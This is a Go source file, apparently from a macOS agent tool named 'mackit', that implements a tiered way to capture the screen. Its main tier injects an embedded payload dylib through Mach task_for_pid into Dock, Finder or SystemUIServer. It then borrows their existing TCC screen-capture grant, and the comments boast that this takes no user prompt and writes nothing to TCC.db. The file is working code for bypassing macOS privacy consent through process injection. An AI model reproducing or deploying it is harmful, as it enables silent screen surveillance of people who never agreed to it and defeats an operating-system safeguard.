// cascade.go – automatic TCC capability acquisition
//
// When a mackit command needs a TCC-protected capability (screen capture,
// accessibility, etc.) the agent tries three tiers in order:
//
//  Tier 1 – Direct
//      Agent binary already has the TCC grant for the service.
//      Used after a successful tcc-provision with SIP off.
//      Zero overhead, always preferred.
//
//  Tier 2 – Mach injection
//      SIP has the task_for_pid flag set (CSRAllowTaskForPID = 0x0004) AND
//      a compiled payload dylib is embedded in this binary.
//      Finds the best running process that already holds the required TCC
//      service (e.g. Dock for ScreenCapture), injects the payload dylib into
//      it, the dylib performs the operation from inside the permissioned
//      process context and writes the result to a temp file.
//      Works even when SIP is fully off (task_for_pid is always available then).
//      Requires NO user prompt, NO grant written to TCC.db.
//
//  Tier 3 – Fallback subprocess
//      Runs the operation as the console user via subprocess.
//      May trigger a one-time user approval dialog on first use if the tool
//      (screencapture, osascript) is not yet in TCC.db.
//      After approval it works silently forever.
//
// Commands call the cascade helpers (cascadeCapture, etc.) instead of calling
// the mackit packages directly. The tiers are completely transparent.

package main

import (
	_ "embed"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"time"

	"mackit/inject"
	"mackit/proc"
	"mackit/screen"
	"mackit/sip"
	"mackit/tcc"
)

// ─── Embedded payload dylibs ─────────────────────────────────────────────────
//
// Compiled from agent/payload/screenshot.c by CI (macos-latest runner).
// Placeholder empty files are committed to git; CI overwrites them with real
// compiled dylibs at release time.  If empty, Tier 2 is skipped gracefully.

//go:embed payload/screenshot_arm64.dylib
var _screenshotDylibArm64 []byte

//go:embed payload/screenshot_amd64.dylib
var _screenshotDylibAmd64 []byte

func screenshotDylibBytes() []byte {
	if runtime.GOARCH == "arm64" {
		return _screenshotDylibArm64
	}
	return _screenshotDylibAmd64
}

// ─── TCC service → known injectable targets ──────────────────────────────────
//
// Processes listed in order of preference (most reliable first).
// These are always running as the console user and hold the listed TCC grants.

var injectTargets = map[tcc.Service][]string{
	tcc.ScreenCapture: {"Dock", "SystemUIServer", "Finder"},
	tcc.Accessibility: {"Dock", "Finder", "SystemUIServer"},
}

// ─── cascadeScreenshot ────────────────────────────────────────────────────────

// cascadeScreenshot returns a base64-encoded JPEG of the full screen using the
// best available technique (three tiers, transparent to the caller).
func cascadeScreenshot() (string, int) {
	// ── Tier 1: agent has ScreenCapture grant — call directly ─────────────────
	if tcc.IsGranted(tcc.ScreenCapture) {
		log.Println("[cascade] tier1: agent has ScreenCapture grant — direct")
		return captureDirect()
	}

	// ── Tier 2: Mach inject into a process that already holds the grant ────────
	dylib := screenshotDylibBytes()
	sipSt := sip.Check()
	if len(dylib) > 0 && sipSt.TaskForPID {
		log.Printf("[cascade] tier2: inject (csr=0x%04X, dylib=%dB)", sipSt.Raw, len(dylib))
		if data, err := injectCapture(tcc.ScreenCapture, dylib); err == nil {
			return base64.StdEncoding.EncodeToString(data), 0
		} else {
			log.Printf("[cascade] tier2 failed: %v — fallback", err)
		}
	} else if len(dylib) == 0 {
		log.Println("[cascade] tier2 skipped: payload dylib not in this build")
	} else {
		log.Printf("[cascade] tier2 skipped: task_for_pid not set (csr=0x%04X)", sipSt.Raw)
	}

	// ── Tier 3: fallback subprocess as console user (may prompt once) ──────────
	log.Println("[cascade] tier3: fallback subprocess")
	return captureDirect()
}

// cascadeScreenshotWindow captures the window matching name using the best tier.
func cascadeScreenshotWindow(name string) (string, int) {
	// Tier 1
	if tcc.IsGranted(tcc.ScreenCapture) {
		return captureWindowDirect(name)
	}
	// Tier 2 — inject gives full screen; accept that for window commands
	dylib := screenshotDylibBytes()
	sipSt := sip.Check()
	if len(dylib) > 0 && sipSt.TaskForPID {
		if data, err := injectCapture(tcc.ScreenCapture, dylib); err == nil {
			return base64.StdEncoding.EncodeToString(data), 0
		} else {
			log.Printf("[cascade] screenshot-window tier2 failed: %v — fallback", err)
		}
	}
	// Tier 3
	return captureWindowDirect(name)
}

// cascadeHasScreenCapture reports whether the agent can capture without prompting.
func cascadeHasScreenCapture() bool {
	if tcc.IsGranted(tcc.ScreenCapture) {
		return true
	}
	dylib := screenshotDylibBytes()
	sipSt := sip.Check()
	return len(dylib) > 0 && sipSt.TaskForPID
}

// ─── Direct capture helpers ───────────────────────────────────────────────────

func captureDirect() (string, int) {
	tmp, err := os.CreateTemp("", "mackit-sc-*.jpg")
	if err != nil {
		return fmt.Sprintf("screenshot: create temp: %v", err), 1
	}
	tmp.Close()
	path := tmp.Name()
	defer os.Remove(path)

	res, err := screen.Capture(screen.Options{
		Output:        path,
		Format:        "jpg",
		AsConsoleUser: true,
	})
	if err != nil {
		return fmt.Sprintf("screenshot: %v", err), 1
	}
	data, err := os.ReadFile(res.Path)
	if err != nil {
		return fmt.Sprintf("screenshot: read: %v", err), 1
	}
	return base64.StdEncoding.EncodeToString(data), 0
}

func captureWindowDirect(name string) (string, int) {
	tmp, err := os.CreateTemp("", "mackit-win-*.jpg")
	if err != nil {
		return fmt.Sprintf("screenshot-window: create temp: %v", err), 1
	}
	tmp.Close()
	path := tmp.Name()
	defer os.Remove(path)

	res, err := screen.CaptureWindow(name, screen.Options{
		Output:        path,
		Format:        "jpg",
		AsConsoleUser: true,
	})
	if err != nil {
		return fmt.Sprintf("screenshot-window: %v", err), 1
	}
	data, err := os.ReadFile(res.Path)
	if err != nil {
		return fmt.Sprintf("screenshot-window: read: %v", err), 1
	}
	return base64.StdEncoding.EncodeToString(data), 0
}

// ─── injectCapture ────────────────────────────────────────────────────────────

// injectCapture finds the best running process holding svc, injects the payload
// dylib, waits for the result file, and returns the PNG bytes.
func injectCapture(svc tcc.Service, dylib []byte) ([]byte, error) {
	// Write dylib to a temp file (inject.DylibMach takes a file path)
	dylibTmp, err := os.CreateTemp("", "mackit-payload-*.dylib")
	if err != nil {
		return nil, fmt.Errorf("write payload dylib tmp: %w", err)
	}
	defer os.Remove(dylibTmp.Name())
	if _, err := dylibTmp.Write(dylib); err != nil {
		dylibTmp.Close()
		return nil, fmt.Errorf("write payload dylib: %w", err)
	}
	dylibTmp.Close()

	// Output path — dylib reads this from /tmp/.mackit-param
	outPath := filepath.Join(os.TempDir(),
		fmt.Sprintf("mackit-cap-%d.png", time.Now().UnixNano()))
	defer os.Remove(outPath)
	defer os.Remove(outPath + ".done")

	// Write param file so dylib knows where to write the result
	if err := os.WriteFile("/tmp/.mackit-param", []byte(outPath), 0600); err != nil {
		return nil, fmt.Errorf("write param file: %w", err)
	}
	defer os.Remove("/tmp/.mackit-param")

	// Find and inject into best available target
	targets := injectTargets[svc]
	if len(targets) == 0 {
		return nil, fmt.Errorf("no known targets for service %s", svc)
	}
	injected := false
	for _, name := range targets {
		pid, err := proc.GetPID(name)
		if err != nil || pid <= 0 {
			continue
		}
		if err := inject.DylibMach(pid, dylibTmp.Name()); err != nil {
			log.Printf("[cascade] inject into %s (pid %d): %v", name, pid, err)
			continue
		}
		log.Printf("[cascade] injected into %s (pid %d)", name, pid)
		injected = true
		break
	}
	if !injected {
		return nil, fmt.Errorf("injection failed for all targets %v", targets)
	}

	// Poll for sentinel file (dylib creates <outPath>.done when finished)
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		if _, err := os.Stat(outPath + ".done"); err == nil {
			break
		}
		time.Sleep(80 * time.Millisecond)
	}
	if _, err := os.Stat(outPath + ".done"); err != nil {
		return nil, fmt.Errorf("inject: timed out waiting for result")
	}

	data, err := os.ReadFile(outPath)
	if err != nil || len(data) == 0 {
		return nil, fmt.Errorf("inject: result file empty or unreadable: %w", err)
	}
	return data, nil
}
